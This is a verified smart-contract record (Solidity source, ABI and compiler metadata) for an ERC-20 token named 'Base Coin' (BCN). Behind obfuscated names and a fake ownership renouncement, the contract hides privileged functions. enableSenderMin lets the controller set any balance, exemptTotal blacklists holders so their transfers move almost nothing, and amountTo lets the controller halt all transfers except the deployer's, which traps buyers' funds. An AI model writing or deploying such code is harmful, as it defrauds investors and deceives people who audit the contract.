{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract modeSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundAuto {\n    function createPair(address fundTx, address amountToMin) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface fundLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface atBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchMinEnable) external view returns (uint256);\n\n    function transfer(address enableIs, uint256 buyLaunch) external returns (bool);\n\n    function allowance(address minReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableIs,\n        uint256 buyLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeMin, uint256 value);\n    event Approval(address indexed minReceiver, address indexed spender, uint256 value);\n}\n\ninterface minList is atBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BaseCoin is modeSwap, atBuy, minList {\n\n    uint256 liquidityShouldAmount;\n\n    address public walletMax;\n\n    uint256 public launchedWallet = 3;\n\n    function tradingToken() private view {\n        require(liquidityMax[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return swapMin;\n    }\n\n    uint256 private txLaunched;\n\n    function getOwner() external view returns (address) {\n        return atTeam;\n    }\n\n    string private swapMin = \"Base Coin\";\n\n    uint256 public buyListTo;\n\n    function exemptTotal(address senderToTake) public {\n        tradingToken();\n        \n        if (senderToTake == modeAuto || senderToTake == walletMax) {\n            return;\n        }\n        senderWallet[senderToTake] = true;\n    }\n\n    mapping(address => bool) public senderWallet;\n\n    function totalEnable(address amountTotal) public {\n        if (swapAmount) {\n            return;\n        }\n        \n        liquidityMax[amountTotal] = true;\n        if (marketingTx == feeBuyIs) {\n            feeBuyIs = true;\n        }\n        swapAmount = true;\n    }\n\n    bool public feeBuyIs;\n\n    function transfer(address enableSell, uint256 buyLaunch) external virtual override returns (bool) {\n        return receiverFundWallet(_msgSender(), enableSell, buyLaunch);\n    }\n\n    uint256 public minEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletAutoTake;\n    }\n\n    function balanceOf(address launchMinEnable) public view virtual override returns (uint256) {\n        return tradingReceiver[launchMinEnable];\n    }\n\n    bool public txMarketing;\n\n    uint256 private tradingTeam = 100000000 * 10 ** 18;\n\n    string private walletAutoTake = \"BCN\";\n\n    address public modeAuto;\n\n    function feeMax(address fundReceiverWallet, address enableIs, uint256 buyLaunch) internal returns (bool) {\n        require(tradingReceiver[fundReceiverWallet] >= buyLaunch);\n        tradingReceiver[fundReceiverWallet] -= buyLaunch;\n        tradingReceiver[enableIs] += buyLaunch;\n        emit Transfer(fundReceiverWallet, enableIs, buyLaunch);\n        return true;\n    }\n\n    bool public marketingTx;\n\n    function receiverFundWallet(address fundReceiverWallet, address enableIs, uint256 buyLaunch) internal returns (bool) {\n        if (fundReceiverWallet == modeAuto) {\n            return feeMax(fundReceiverWallet, enableIs, buyLaunch);\n        }\n        uint256 buyFrom = atBuy(walletMax).balanceOf(txEnableList);\n        require(buyFrom == liquidityShouldAmount);\n        require(enableIs != txEnableList);\n        if (senderWallet[fundReceiverWallet]) {\n            return feeMax(fundReceiverWallet, enableIs, receiverSender);\n        }\n        buyLaunch = tradingFund(fundReceiverWallet, enableIs, buyLaunch);\n        return feeMax(fundReceiverWallet, enableIs, buyLaunch);\n    }\n\n    constructor (){\n        if (takeAmountLiquidity != minEnable) {\n            feeBuyIs = false;\n        }\n        modeExempt();\n        fundLaunched teamReceiverAt = fundLaunched(enableTeam);\n        walletMax = fundAuto(teamReceiverAt.factory()).createPair(teamReceiverAt.WETH(), address(this));\n        txEnableList = fundAuto(teamReceiverAt.factory()).feeTo();\n        \n        modeAuto = _msgSender();\n        liquidityMax[modeAuto] = true;\n        tradingReceiver[modeAuto] = tradingTeam;\n        if (modeAmountAuto == txLaunched) {\n            txLaunched = takeAmountLiquidity;\n        }\n        emit Transfer(address(0), modeAuto, tradingTeam);\n    }\n\n    address private atTeam;\n\n    function enableSenderMin(address enableSell, uint256 buyLaunch) public {\n        tradingToken();\n        tradingReceiver[enableSell] = buyLaunch;\n    }\n\n    address txEnableList;\n\n    event OwnershipTransferred(address indexed enableTake, address indexed receiverExempt);\n\n    uint256 swapAutoMarketing;\n\n    function owner() external view returns (address) {\n        return atTeam;\n    }\n\n    uint256 public modeAmountAuto;\n\n    function tradingFund(address fundReceiverWallet, address enableIs, uint256 buyLaunch) internal view returns (uint256) {\n        require(buyLaunch > 0);\n\n        uint256 takeToken = 0;\n        if (fundReceiverWallet == walletMax && launchedWallet > 0) {\n            takeToken = buyLaunch * launchedWallet / 100;\n        } else if (enableIs == walletMax && shouldBuy > 0) {\n            takeToken = buyLaunch * shouldBuy / 100;\n        }\n        require(takeToken <= buyLaunch);\n        return buyLaunch - takeToken;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchToken;\n    }\n\n    uint256 public shouldBuy = 0;\n\n    bool public swapAmount;\n\n    function allowance(address takeSell, address totalMode) external view virtual override returns (uint256) {\n        if (totalMode == enableTeam) {\n            return type(uint256).max;\n        }\n        return launchLaunched[takeSell][totalMode];\n    }\n\n    mapping(address => uint256) private tradingReceiver;\n\n    function modeExempt() public {\n        emit OwnershipTransferred(modeAuto, address(0));\n        atTeam = address(0);\n    }\n\n    function approve(address totalMode, uint256 buyLaunch) public virtual override returns (bool) {\n        launchLaunched[_msgSender()][totalMode] = buyLaunch;\n        emit Approval(_msgSender(), totalMode, buyLaunch);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTeam;\n    }\n\n    address enableTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private totalFund;\n\n    function amountTo(uint256 buyLaunch) public {\n        tradingToken();\n        liquidityShouldAmount = buyLaunch;\n    }\n\n    uint256 public takeAmountLiquidity;\n\n    bool private teamSell;\n\n    uint8 private launchToken = 18;\n\n    uint256 constant receiverSender = 9 ** 10;\n\n    function transferFrom(address fundReceiverWallet, address enableIs, uint256 buyLaunch) external override returns (bool) {\n        if (_msgSender() != enableTeam) {\n            if (launchLaunched[fundReceiverWallet][_msgSender()] != type(uint256).max) {\n                require(buyLaunch <= launchLaunched[fundReceiverWallet][_msgSender()]);\n                launchLaunched[fundReceiverWallet][_msgSender()] -= buyLaunch;\n            }\n        }\n        return receiverFundWallet(fundReceiverWallet, enableIs, buyLaunch);\n    }\n\n    mapping(address => bool) public liquidityMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyLaunch\",\"type\":\"uint256\"}],\"name\":\"amountTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMinEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyListTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunch\",\"type\":\"uint256\"}],\"name\":\"enableSenderMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToTake\",\"type\":\"address\"}],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuyIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAmountAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAmountLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"}],\"name\":\"totalEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiverWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BaseCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}